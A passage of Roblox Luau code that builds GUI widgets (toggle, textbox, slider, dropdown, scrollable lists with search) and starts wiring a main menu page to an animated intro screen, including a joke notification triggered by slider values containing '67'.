	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, 10)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	local Button = Util.Instance("TextButton", Container)
	Button.AnchorPoint = Vector2.new(0, 0)
	Button.Position = UDim2.new(0, 0, 0, 0)
	Button.Size = UDim2.new(1, 0, 1, 0)
	Button.BackgroundTransparency = 1
	Button.Text = ""
	local ButtonText = Util.Instance("TextLabel", Button)
	ButtonText.AnchorPoint = Vector2.new(0, 0)
	ButtonText.Position = UDim2.new(0, margin, 0, 0)
	ButtonText.Size = UDim2.new(1, margin * -3 - switchsize, 1, 0)
	ButtonText.BackgroundTransparency = 1
	ButtonText.RichText = true
	ButtonText.Font = UIFont
	ButtonText.TextColor3 = Color3.new(1, 1, 1)
	ButtonText.TextTransparency = 0
	ButtonText.TextXAlignment = Enum.TextXAlignment.Left
	ButtonText.TextYAlignment = Enum.TextYAlignment.Center
	ButtonText.TextWrapped = true
	ButtonText.TextSize = 20
	RegisterTextLabel(ButtonText)
	local function update()
		local x = parent.AbsoluteSize.X
		local size = TextService:GetTextSize(ButtonText.ContentText, ButtonText.TextSize, ButtonText.Font, Vector2.new(x - margin * 3 - switchsize, math.huge))
		Container.Size = UDim2.new(1, 0, 0, math.max(35, size.Y))
	end
	ButtonText.Text = text
	update()
	ButtonText.Changed:Connect(update)
	local Switch = Util.Instance("Frame", Container)
	Switch.AnchorPoint = Vector2.new(1, 0.5)
	Switch.Position = UDim2.new(1, -margin, 0.5, 0)
	Switch.Size = UDim2.new(0, 25, 0, 25)
	Switch.BackgroundTransparency = 0
	Switch.BackgroundColor3 = Color3.new(0, 0, 0)
	Switch.BorderSizePixel = 0
	Util.Instance("UICorner", Switch).CornerRadius = UDim.new(0, 5)
	Stylize(Switch)
	local SwitchDot = Util.Instance("Frame", Switch)
	SwitchDot.AnchorPoint = Vector2.new(0.5, 0.5)
	SwitchDot.Position = UDim2.new(0.5, 0, 0.5, 0)
	SwitchDot.Size = UDim2.new(0, 19, 0, 19)
	SwitchDot.BackgroundTransparency = 0.2
	SwitchDot.BackgroundColor3 = UITextColor.Value
	SwitchDot.BorderSizePixel = 0
	Util.LinkDestroyI2C(SwitchDot, UITextColor.Changed:Connect(function(val)
		SwitchDot.BackgroundColor3 = val
	end))
	Util.Instance("UICorner", SwitchDot).CornerRadius = UDim.new(0, 2)
	local Lever = Util.Instance("BoolValue")
	Lever.Value = value
	local dotfull = UDim2.fromOffset(19, 19)
	local dotzero = UDim2.fromOffset(0, 0)
	local dottween = nil
	local function updatesw(instant)
		if dottween then
			dottween:Cancel()
			dottween = nil
		end
		local on = Lever.Value
		if instant == true then
			SwitchDot.Size = on and dotfull or dotzero
			SwitchDot.Visible = on
			return
		end
		if on then
			SwitchDot.Visible = true
		end
		local tw = TweenService:Create(SwitchDot, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
			Size = on and dotfull or dotzero,
		})
		dottween = tw
		tw.Completed:Connect(function(state)
			if dottween == tw and state == Enum.PlaybackState.Completed then
				dottween = nil
				SwitchDot.Visible = Lever.Value
			end
		end)
		tw:Play()
	end
	Lever.Changed:Connect(function()
		updatesw(false)
	end)
	updatesw(true)
	Button.Activated:Connect(function()
		Lever.Value = not Lever.Value
	end)
	return Lever, ButtonText
end
function UI.CreateTextbox(parent, text, placeholder, size)
	local margin = 5
	local Container = Util.Instance("Frame", parent)
	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, 65536)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	local Box = Util.Instance("Frame", Container)
	Box.AnchorPoint = Vector2.new(0, 0)
	Box.Position = UDim2.new(0, margin, 0, margin // 2)
	Box.Size = UDim2.new(1, margin * -2, 1, -margin)
	Box.BackgroundTransparency = 0
	Box.BackgroundColor3 = Color3.new(0.9, 0.9, 0.9)
	Box.BorderSizePixel = 0
	local BoxText = Util.Instance("TextBox", Box)
	BoxText.AnchorPoint = Vector2.new(0, 0.5)
	BoxText.Position = UDim2.new(0, 0, 0.5, 0)
	BoxText.Size = UDim2.new(1, 0, 1, -margin)
	BoxText.BackgroundTransparency = 1
	BoxText.Font = UIFont
	BoxText.TextColor3 = Color3.new(1, 1, 1)
	BoxText.PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
	BoxText.TextTransparency = 0
	BoxText.TextXAlignment = Enum.TextXAlignment.Center
	BoxText.TextYAlignment = Enum.TextYAlignment.Center
	BoxText.TextWrapped = true
	BoxText.TextSize = size
	BoxText.ClearTextOnFocus = false
	RegisterTextLabel(BoxText)
	BoxText.Focused:Connect(function()
		UISound.Click:Play()
	end)
	Stylize(Box, {
		Depthed = true,
	})
	local function update()
		local x = parent.AbsoluteSize.X
		if not BoxText.TextWrapped then
			x = math.huge
		end
		local t = BoxText.Text
		if t:len() == 0 then
			t = BoxText.PlaceholderText
		end
		local size = TextService:GetTextSize(t, BoxText.TextSize, BoxText.Font, Vector2.new(x - margin * 2, math.huge))
		Container.Size = UDim2.new(1, 0, 0, size.Y + margin * 2 + 2)
	end
	BoxText.Text = text
	BoxText.PlaceholderText = placeholder
	update()
	BoxText.Changed:Connect(update)
	return BoxText
end
function UI.CreateSlider(parent, text, value, min, max, step)
	min = min or 1
	max = max or 10
	step = math.abs(step or 0)
	assert(max > min)
	local margin = 5
	local Container = Util.Instance("Frame", parent)
	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, 65)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	local Text = Util.Instance("TextLabel", Container)
	Text.AnchorPoint = Vector2.new(0, 0)
	Text.Position = UDim2.new(0, margin, 0, 0)
	Text.Size = UDim2.new(1, margin * -2, 0, 35)
	Text.BackgroundTransparency = 1
	Text.RichText = true
	Text.Font = UIFont
	Text.TextColor3 = Color3.new(1, 1, 1)
	Text.TextTransparency = 0
	Text.TextXAlignment = Enum.TextXAlignment.Left
	Text.TextYAlignment = Enum.TextYAlignment.Center
	Text.TextWrapped = true
	Text.TextSize = 20
	Text.Text = text
	RegisterTextLabel(Text)
	local Box = Util.Instance("Frame", Container)
	Box.AnchorPoint = Vector2.new(1, 0)
	Box.Position = UDim2.new(1, -margin, 0, margin)
	Box.Size = UDim2.new(0, 80, 0, 35 - margin * 2)
	Box.BackgroundTransparency = 0
	Box.BackgroundColor3 = Color3.new(1, 1, 1)
	Box.BorderSizePixel = 0
	local BoxText = Util.Instance("TextBox", Box)
	BoxText.AnchorPoint = Vector2.new(0, 0.5)
	BoxText.Position = UDim2.new(0, 0, 0.5, 0)
	BoxText.Size = UDim2.new(1, 0, 1, -margin)
	BoxText.BackgroundTransparency = 1
	BoxText.Font = UIFont
	BoxText.TextColor3 = Color3.new(1, 1, 1)
	BoxText.PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
	BoxText.TextTransparency = 0
	BoxText.TextXAlignment = Enum.TextXAlignment.Center
	BoxText.TextYAlignment = Enum.TextYAlignment.Center
	BoxText.TextWrapped = true
	BoxText.TextSize = 15
	BoxText.ClearTextOnFocus = false
	RegisterTextLabel(BoxText)
	BoxText.Focused:Connect(function()
		UISound.Click:Play()
	end)
	Stylize(Box, {
		Depthed = true,
	})
	local SliderC = Util.Instance("TextButton", Container)
	SliderC.AnchorPoint = Vector2.new(0, 0)
	SliderC.Position = UDim2.new(0, 0, 0, 40)
	SliderC.Size = UDim2.new(1, 0, 0, 20)
	SliderC.BackgroundTransparency = 1
	SliderC.Text = ""
	SliderC.AutoButtonColor = true
	local SliderR = Util.Instance("Frame", SliderC)
	SliderR.AnchorPoint = Vector2.new(0.5, 0.5)
	SliderR.Position = UDim2.new(0.5, 0, 0.5, 0)
	SliderR.Size = UDim2.new(1, margin * -2 - 18, 0, 5)
	SliderR.BackgroundTransparency = 0
	SliderR.BackgroundColor3 = Color3.new(1, 1, 1)
	SliderR.BorderSizePixel = 0
	local SliderB = Util.Instance("Frame", SliderR)
	SliderB.AnchorPoint = Vector2.new(0.5, 0.5)
	SliderB.Position = UDim2.new(0, 0, 0.5, 0)
	SliderB.Size = UDim2.new(0, 18, 0, 18)
	SliderB.BackgroundTransparency = 0
	SliderB.BackgroundColor3 = Color3.new(1, 1, 1)
	SliderB.BorderSizePixel = 0
	SliderB.ZIndex = 2
	Stylize(SliderR, {
		Depthed = true,
	})
	Stylize(SliderB)
	local range = max - min
	if step > 0 then
		if range / step < 20 then
			local i = min + step
			while i < max do
				local snaps = Util.Instance("Frame", SliderR)
				snaps.AnchorPoint = Vector2.new(0.5, 0)
				snaps.Position = UDim2.new((i - min) / range, 0, 0, 1)
				snaps.Size = UDim2.new(0, 1, 0, 3)
				snaps.BackgroundTransparency = 0.5
				snaps.BackgroundColor3 = Color3.new(1, 1, 1)
				snaps.BorderSizePixel = 0
				i += step
			end
		end
	end
	local Select = Util.Instance("NumberValue")
	local function update()
		local str = string.format("%.3f", Select.Value)
		if str:find("%.") then
			while str:sub(-1) == "0" do
				str = str:sub(1, -2)
				if str:sub(-1) == "." then
					str = str:sub(1, -2)
					break
				end
			end
		end
		BoxText.Text = str
		SliderB.Position = UDim2.new(math.clamp((Select.Value - min) / (max - min), 0, 1), 0, 0.5, 0)
		if math.random(4) == 1 then
			if str:find("67") or str:find("6.7") then
				Util.UINotify("SIX SEVENNNN 67 67 67 67 OMG")
			end
		end
	end
	Select.Value = value
	Select.Changed:Connect(update)
	update()
	BoxText.FocusLost:Connect(function()
		Select.Value = tonumber(BoxText.Text) or Select.Value
		update()
	end)
	local function ondrag(x)
		local val = range * math.clamp((x - SliderR.AbsolutePosition.X) / SliderR.AbsoluteSize.X, 0, 1)
		if step > 0 then
			val = math.round(val / step) * step
		end
		val += min
		Select.Value = val
	end
	local dragref = nil
	local start = nil
	SliderC.InputBegan:Connect(function(input)
		if input.UserInputState ~= Enum.UserInputState.Begin then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragref = input
			start = input.Position
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragref then
			if input.UserInputType == Enum.UserInputType.MouseMovement or (input.UserInputType == Enum.UserInputType.Touch and dragref == input) then
				if start then
					local delta = input.Position - start
					if delta.Magnitude > 10 then
						start = nil
						if math.abs(delta.X) < math.abs(delta.Y) then
							dragref = nil
						end
					end
				else
					ondrag(input.Position.X)
				end
			end
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if dragref and dragref == input then
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				ondrag(input.Position.X)
				dragref = nil
			end
		end
	end)
	return Select
end
function UI.CreateDropdown(parent, text, array, value)
	value = value and math.clamp(value, 1, #array) or 1
	local margin = 5
	local Container = Util.Instance("Frame", parent)
	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, 10)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	local Text = Util.Instance("TextLabel", Container)
	Text.AnchorPoint = Vector2.new(0, 0)
	Text.Position = UDim2.new(0, margin, 0, 0)
	Text.Size = UDim2.new(1, margin * -2, 1, 0)
	Text.BackgroundTransparency = 1
	Text.RichText = true
	Text.Font = UIFont
	Text.TextColor3 = Color3.new(1, 1, 1)
	Text.TextTransparency = 0
	Text.TextXAlignment = Enum.TextXAlignment.Left
	Text.TextYAlignment = Enum.TextYAlignment.Center
	Text.TextWrapped = true
	Text.TextSize = 20
	RegisterTextLabel(Text)
	local Dropdown = Util.Instance("TextButton", Container)
	Dropdown.AnchorPoint = Vector2.new(1, 0.5)
	Dropdown.Position = UDim2.new(1, -margin, 0.5, 0)
	Dropdown.Size = UDim2.new(0.5, 0, 1, -margin)
	Dropdown.BackgroundTransparency = 0
	Dropdown.BackgroundColor3 = Color3.new(1, 1, 1)
	Dropdown.BorderSizePixel = 0
	Dropdown.Text = ""
	Dropdown.AutoButtonColor = true
	local DropdownText = Util.Instance("TextLabel", Dropdown)
	DropdownText.AnchorPoint = Vector2.new(0.5, 0.5)
	DropdownText.Position = UDim2.new(0.5, 0, 0.5, 0)
	DropdownText.Size = UDim2.new(1, -margin * 2, 1, -margin)
	DropdownText.BackgroundTransparency = 1
	DropdownText.RichText = true
	DropdownText.Font = UIFont
	DropdownText.TextColor3 = Color3.new(1, 1, 1)
	DropdownText.TextTransparency = 0
	DropdownText.TextXAlignment = Enum.TextXAlignment.Center
	DropdownText.TextYAlignment = Enum.TextYAlignment.Center
	DropdownText.TextWrapped = true
	DropdownText.TextSize = 15
	RegisterTextLabel(DropdownText)
	Stylize(Dropdown)
	local function update()
		local x = parent.AbsoluteSize.X
		local size1 = TextService:GetTextSize(Text.ContentText, Text.TextSize, Text.Font, Vector2.new(x - margin * 2, math.huge))
		local size2 = TextService:GetTextSize(DropdownText.ContentText, DropdownText.TextSize, DropdownText.Font, Vector2.new(x * 0.8 - margin * 2, math.huge))
		Container.Size = UDim2.new(1, 0, 0, math.max(35, size1.Y, size2.Y + margin * 2))
		Dropdown.Size = UDim2.new(0, math.max(60, size2.X + margin * 2 + 2), 0, math.max(25, size2.Y + margin * 2))
	end
	Text.Text = text
	DropdownText.Text = array[value]
	update()
	Text.Changed:Connect(update)
	DropdownText.Changed:Connect(update)
	local Select = Util.Instance("IntValue")
	Select.Value = value
	Select.Changed:Connect(function()
		DropdownText.Text = array[Select.Value]
	end)
	local Droplist = Util.Instance("ScrollingFrame", UIMainFrame)
	Droplist.AnchorPoint = Vector2.new(0, 0)
	Droplist.Position = UDim2.new(0, 0, 0, 0)
	Droplist.Size = UDim2.new(0, 0, 0, 0)
	Droplist.BackgroundTransparency = 0
	Droplist.BackgroundColor3 = Color3.new(1, 1, 1)
	Droplist.BorderSizePixel = 0
	Droplist.Visible = false
	Droplist.CanvasSize = UDim2.new(0, 0, 0, 0)
	Droplist.AutomaticCanvasSize = Enum.AutomaticSize.Y
	Droplist.ScrollBarThickness = 0
	Droplist.ScrollingDirection = Enum.ScrollingDirection.Y
	local Padding = Util.Instance("UIPadding", Droplist)
	Padding.PaddingLeft = UDim.new(0, 5)
	Padding.PaddingRight = UDim.new(0, 5)
	Padding.PaddingTop = UDim.new(0, 0)
	Padding.PaddingBottom = UDim.new(0, 0)
	local UIList = Util.Instance("UIListLayout", Droplist)
	UIList.FillDirection = Enum.FillDirection.Vertical
	UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIList.VerticalAlignment = Enum.VerticalAlignment.Top
	UIList.Padding = UDim.new(0, 0)
	UIList.SortOrder = Enum.SortOrder.LayoutOrder
	Stylize(Droplist, {
		Glow = true
	})
	local items = {}
	local sizex = 60
	local interact = false
	local opened = false
	Util.LinkDestroyI2I(Dropdown, Droplist)
	for i,itemname in array do
		local Item = Util.Instance("TextButton", Droplist)
		Item.Size = UDim2.new(1, 0, 0, 20)
		Item.BackgroundTransparency = 0
		Item.BackgroundColor3 = Color3.new(0, 0, 0)
		Item.BorderSizePixel = 0
		Item.AutoButtonColor = true
		Item.LayoutOrder = i
		Item.Text = itemname
		Item.TextSize = 15
		Item.Font = UIFont
		Item.TextColor3 = Color3.new(1, 1, 1)
		Item.TextXAlignment = Enum.TextXAlignment.Left
		Item.TextYAlignment = Enum.TextYAlignment.Center
		Item.TextWrapped = false
		RegisterTextLabel(Item)
		table.insert(items, Item)
		local size = TextService:GetTextSize(itemname, Item.TextSize, Item.Font, Vector2.new(math.huge, math.huge))
		sizex = math.max(sizex, size.X + 12)
		Item.Activated:Connect(function()
			Select.Value = i
			opened = false
			interact = true
		end)
		Item.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				interact = true
				UISound.Click:Play()
			end
		end)
	end
	Dropdown.Activated:Connect(function()
		opened = not opened
		interact = true
	end)
	local conn = UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			task.wait()
			if not interact then
				opened = false
			end
			interact = false
		end
	end)
	Util.LinkDestroyI2C(Dropdown, conn)
	local scrollframe = Container:FindFirstAncestorWhichIsA("ScrollingFrame")
	if scrollframe then
		local conn = scrollframe:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
			opened = false
		end)
	end
	local opentween = 0
	AddToRenderStep(function(t, dt)
		if opened then
			opentween = 1 + (opentween - 1) * math.exp(-14 * dt)
			Droplist.ZIndex = 4
			Droplist.Interactable = true
		else
			opentween *= math.exp(-14 * dt)
			Droplist.ZIndex = 3
			Droplist.Interactable = false
		end
		local ysize = math.round(math.min(90, #items * 20) * opentween)
		if ysize >= 1 then
			Droplist.Position = Util.Vector2ToUDim2Offset((Dropdown.AbsolutePosition + Vector2.new(0, Dropdown.AbsoluteSize.Y)) - UIMainFrame.AbsolutePosition)
			Droplist.Size = UDim2.new(0, math.max(Dropdown.Size.X.Offset, sizex), 0, ysize)
			Droplist.Visible = true
		else
			Droplist.Visible = false
		end
		local i1 = GetUIBGColor(t)
		local i2 = i1:Lerp(Color3.new(1, 1, 1), 0.1)
		for i,v in items do
			if i == Select.Value then
				v.BackgroundColor3 = i2
			else
				v.BackgroundColor3 = i1
			end
		end
	end, Droplist)
	Util.LinkDestroyI2I(Dropdown, Select)
	return Select, Text
end
function UI.CreateCanvas(parent)
	local margin = 5
	local Container = Util.Instance("Frame", parent)
	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, 30)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	Container.AutomaticSize = Enum.AutomaticSize.Y
	local Padding = Util.Instance("UIPadding", Container)
	Padding.PaddingTop = UDim.new(0, 2)
	Padding.PaddingBottom = UDim.new(0, 2)
	Padding.PaddingLeft = UDim.new(0, 5)
	Padding.PaddingRight = UDim.new(0, 5)
	local ListBox = Util.Instance("Frame", Container)
	ListBox.AnchorPoint = Vector2.new(0, 0)
	ListBox.Position = UDim2.new(0, 0, 0, 0)
	ListBox.Size = UDim2.new(1, 0, 0, 26)
	ListBox.BackgroundTransparency = 0
	ListBox.BackgroundColor3 = Color3.new(0.7, 0.7, 0.7)
	ListBox.BorderSizePixel = 0
	ListBox.AutomaticSize = Enum.AutomaticSize.Y
	Stylize(ListBox, {
		Depthed = true,
	})
	Padding = Util.Instance("UIPadding", ListBox)
	Padding.PaddingTop = UDim.new(0, 5)
	Padding.PaddingBottom = UDim.new(0, 5)
	Padding.PaddingLeft = UDim.new(0, 0)
	Padding.PaddingRight = UDim.new(0, 0)
	local UIList = Util.Instance("UIListLayout", ListBox)
	UIList.FillDirection = Enum.FillDirection.Vertical
	UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIList.VerticalAlignment = Enum.VerticalAlignment.Top
	UIList.Padding = UDim.new(0, 0)
	UIList.SortOrder = Enum.SortOrder.LayoutOrder
	Util.LinkDestroyI2I(ListBox, Container)
	return ListBox
end
function UI.CreateScrollCanvas(parent, height)
	local margin = 5
	local Container = Util.Instance("Frame", parent)
	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, height)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	local Padding = Util.Instance("UIPadding", Container)
	Padding.PaddingTop = UDim.new(0, 2)
	Padding.PaddingBottom = UDim.new(0, 2)
	Padding.PaddingLeft = UDim.new(0, 5)
	Padding.PaddingRight = UDim.new(0, 5)
	local ListBox = Util.Instance("ScrollingFrame", Container)
	ListBox.AnchorPoint = Vector2.new(0, 0)
	ListBox.Position = UDim2.new(0, 0, 0, 0)
	ListBox.Size = UDim2.new(1, 0, 0, 26)
	ListBox.BackgroundTransparency = 0
	ListBox.BackgroundColor3 = Color3.new(0.7, 0.7, 0.7)
	ListBox.BorderSizePixel = 0
	ListBox.AutomaticCanvasSize = Enum.AutomaticSize.Y
	ListBox.CanvasSize = UDim2.new(0, 0, 0, 0)
	ListBox.ClipsDescendants = true
	ListBox.ScrollingDirection = Enum.ScrollingDirection.Y
	ListBox.ScrollBarThickness = 3
	ListBox.ElasticBehavior = Enum.ElasticBehavior.Always
	ListBox.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	ListBox.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	ListBox.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	ListBox.ScrollBarImageTransparency = 0.5
	ListBox.ScrollBarImageColor3 = UITextColor.Value
	Util.LinkDestroyI2C(ListBox, UITextColor.Changed:Connect(function(val)
		ListBox.ScrollBarImageColor3 = val
	end))
	Stylize(ListBox, {
		Depthed = true,
	})
	Padding = Util.Instance("UIPadding", ListBox)
	Padding.PaddingTop = UDim.new(0, 5)
	Padding.PaddingBottom = UDim.new(0, 5)
	Padding.PaddingLeft = UDim.new(0, 0)
	Padding.PaddingRight = UDim.new(0, 0)
	local UIList = Util.Instance("UIListLayout", ListBox)
	UIList.FillDirection = Enum.FillDirection.Vertical
	UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIList.VerticalAlignment = Enum.VerticalAlignment.Top
	UIList.Padding = UDim.new(0, 0)
	UIList.SortOrder = Enum.SortOrder.LayoutOrder
	Util.LinkDestroyI2I(ListBox, Container)
	return ListBox
end
function UI.CreateItemListPage()
	local margin = 5
	local Frame = Util.Instance("Frame", WindowContent)
	Frame.AnchorPoint = Vector2.new(0.5, 0.5)
	Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
	Frame.Size = UDim2.new(0, 360, 0, 205)
	Frame.BackgroundTransparency = 0
	Frame.BackgroundColor3 = Color3.new(0, 0, 0)
	Frame.BorderSizePixel = 1
	Frame.BorderColor3 = Color3.new(1, 1, 1)
	Frame.Visible = true
	Frame.ZIndex = 0
	Frame.ClipsDescendants = true
	AddToRenderStep(function(t)
		Frame.BorderColor3 = GetUIColor(t)
		Frame.BackgroundColor3 = GetUIBGColor(t)
	end, Frame)
	local Padding = Util.Instance("UIPadding", Frame)
	Padding.PaddingTop = UDim.new(0, margin)
	Padding.PaddingBottom = UDim.new(0, margin)
	Padding.PaddingLeft = UDim.new(0, margin)
	Padding.PaddingRight = UDim.new(0, margin)
	local BackButton = Util.Instance("TextButton", Frame)
	BackButton.AnchorPoint = Vector2.new(0, 0)
	BackButton.Position = UDim2.new(0, 0, 0, 0)
	BackButton.Size = UDim2.new(0, 30, 0, 25)
	BackButton.BackgroundTransparency = 0
	BackButton.BackgroundColor3 = Color3.new(1, 1, 1)
	BackButton.BorderSizePixel = 0
	BackButton.Text = ""
	BackButton.AutoButtonColor = true
	local BackButtonText = Util.Instance("TextLabel", BackButton)
	BackButtonText.AnchorPoint = Vector2.new(0.5, 0.5)
	BackButtonText.Position = UDim2.new(0.5, 0, 0.5, 0)
	BackButtonText.Size = UDim2.new(1, margin * -2, 1, -margin)
	BackButtonText.BackgroundTransparency = 1
	BackButtonText.Font = UIFont
	BackButtonText.TextColor3 = Color3.new(1, 1, 1)
	BackButtonText.TextTransparency = 0
	BackButtonText.TextXAlignment = Enum.TextXAlignment.Center
	BackButtonText.TextYAlignment = Enum.TextYAlignment.Center
	BackButtonText.TextWrapped = true
	BackButtonText.TextSize = 20
	BackButtonText.Text = "<"
	RegisterTextLabel(BackButtonText)
	Stylize(BackButton)
	local SearchBox = Util.Instance("Frame", Frame)
	SearchBox.AnchorPoint = Vector2.new(1, 0)
	SearchBox.Position = UDim2.new(1, 0, 0, 0)
	SearchBox.Size = UDim2.new(1, -margin - 30, 0, 25)
	SearchBox.BackgroundTransparency = 0
	SearchBox.BackgroundColor3 = Color3.new(0.9, 0.9, 0.9)
	SearchBox.BorderSizePixel = 0
	local SearchBoxText = Util.Instance("TextBox", SearchBox)
	SearchBoxText.AnchorPoint = Vector2.new(0.5, 0.5)
	SearchBoxText.Position = UDim2.new(0.5, 0, 0.5, 0)
	SearchBoxText.Size = UDim2.new(1, margin * -2, 1, -margin)
	SearchBoxText.BackgroundTransparency = 1
	SearchBoxText.Font = UIFont
	SearchBoxText.TextColor3 = Color3.new(1, 1, 1)
	SearchBoxText.PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
	SearchBoxText.TextTransparency = 0
	SearchBoxText.TextXAlignment = Enum.TextXAlignment.Left
	SearchBoxText.TextYAlignment = Enum.TextYAlignment.Center
	SearchBoxText.TextWrapped = true
	SearchBoxText.TextSize = 20
	SearchBoxText.ClearTextOnFocus = false
	SearchBoxText.Focused:Connect(function()
		UISound.Click:Play()
	end)
	Stylize(SearchBox, {
		Depthed = true,
	})
	SearchBoxText.Text = ""
	SearchBoxText.PlaceholderText = "Seek..."
	RegisterTextLabel(SearchBoxText)
	local ListBox = Util.Instance("ScrollingFrame", Frame)
	ListBox.AnchorPoint = Vector2.new(0, 0)
	ListBox.Position = UDim2.new(0, 0, 0, 25 + margin)
	ListBox.Size = UDim2.new(1, 0, 1, -margin - 25)
	ListBox.BackgroundTransparency = 0
	ListBox.BackgroundColor3 = Color3.new(0.7, 0.7, 0.7)
	ListBox.BorderSizePixel = 0
	ListBox.AutomaticCanvasSize = Enum.AutomaticSize.Y
	ListBox.CanvasSize = UDim2.new(0, 0, 0, 0)
	ListBox.ClipsDescendants = true
	ListBox.ScrollingDirection = Enum.ScrollingDirection.Y
	ListBox.ScrollBarThickness = 3
	ListBox.ElasticBehavior = Enum.ElasticBehavior.Always
	ListBox.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	ListBox.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	ListBox.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	ListBox.ScrollBarImageTransparency = 0.5
	ListBox.ScrollBarImageColor3 = UITextColor.Value
	Util.LinkDestroyI2C(ListBox, UITextColor.Changed:Connect(function(val)
		ListBox.ScrollBarImageColor3 = val
	end))
	Stylize(ListBox, {
		Depthed = true,
	})
	Padding = Util.Instance("UIPadding", ListBox)
	Padding.PaddingTop = UDim.new(0, 5)
	Padding.PaddingBottom = UDim.new(0, 5)
	Padding.PaddingLeft = UDim.new(0, 0)
	Padding.PaddingRight = UDim.new(0, 0)
	local UIList = Util.Instance("UIListLayout", ListBox)
	UIList.FillDirection = Enum.FillDirection.Vertical
	UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIList.VerticalAlignment = Enum.VerticalAlignment.Top
	UIList.Padding = UDim.new(0, 0)
	UIList.SortOrder = Enum.SortOrder.LayoutOrder
	BackButton.Name = "Back"
	BackButtonText.Name = "Label"
	SearchBox.Name = "Search"
	SearchBoxText.Name = "Box"
	ListBox.Name = "List"
	SearchBoxText:GetPropertyChangedSignal("Text"):Connect(function()
		for _,v in ListBox:GetChildren() do
			if v:IsA("GuiObject") then
				v.Visible = not not v.Name:lower():find(SearchBoxText.Text:lower())
			end
		end
	end)
	return Frame
end
function UI.CreateItemListItem(parent)
	local margin = 5
	local Container = Util.Instance("Frame", parent)
	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, 30)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	Container.AutomaticSize = Enum.AutomaticSize.Y
	local Padding = Util.Instance("UIPadding", Container)
	Padding.PaddingTop = UDim.new(0, 2)
	Padding.PaddingBottom = UDim.new(0, 2)
	Padding.PaddingLeft = UDim.new(0, 5)
	Padding.PaddingRight = UDim.new(0, 5)
	local ListBox = Util.Instance("TextButton", Container)
	ListBox.AnchorPoint = Vector2.new(0, 0)
	ListBox.Position = UDim2.new(0, 0, 0, 0)
	ListBox.Size = UDim2.new(1, 0, 0, 26)
	ListBox.BackgroundTransparency = 0
	ListBox.BackgroundColor3 = Color3.new(0.7, 0.7, 0.7)
	ListBox.BorderSizePixel = 0
	ListBox.AutomaticSize = Enum.AutomaticSize.Y
	ListBox.Text = ""
	Stylize(ListBox)
	Padding = Util.Instance("UIPadding", ListBox)
	Padding.PaddingTop = UDim.new(0, 5)
	Padding.PaddingBottom = UDim.new(0, 5)
	Padding.PaddingLeft = UDim.new(0, 0)
	Padding.PaddingRight = UDim.new(0, 0)
	local UIList = Util.Instance("UIListLayout", ListBox)
	UIList.FillDirection = Enum.FillDirection.Vertical
	UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIList.VerticalAlignment = Enum.VerticalAlignment.Top
	UIList.Padding = UDim.new(0, 0)
	UIList.SortOrder = Enum.SortOrder.LayoutOrder
	Util.LinkDestroyI2I(ListBox, Container)
	return ListBox
end

local MainPage = UI.CreatePage()
MainPage.Interactable = false
CracktroFrame.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		if _totalrendertime < 1 or not IsUhhhhhhFullyLoaded then return end
		CracktroFrame.Interactable = false
		CracktroFrame.Visible = true
		MainPage.Interactable = false
		local tween = TweenService:Create(CracktroFrame, UITweenInfo, {
			Position = UDim2.new(0.5, -362, 0.5, 0),
		})
		tween:Play()
		tween.Completed:Connect(function()
			CracktroFrame.Visible = false
			MainPage.Interactable = true
		end)
	end
end)
UI.CreateSeparator(MainPage)
UI.CreateButton(MainPage, " &lt; Back to cool scene", 20).Activated:Connect(function()
	CracktroFrame.Interactable = false
	CracktroFrame.Visible = true
	MainPage.Interactable = false
	local tween = TweenService:Create(CracktroFrame, UITweenInfo, {
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})
	tween:Play()
	tween.Completed:Connect(function()
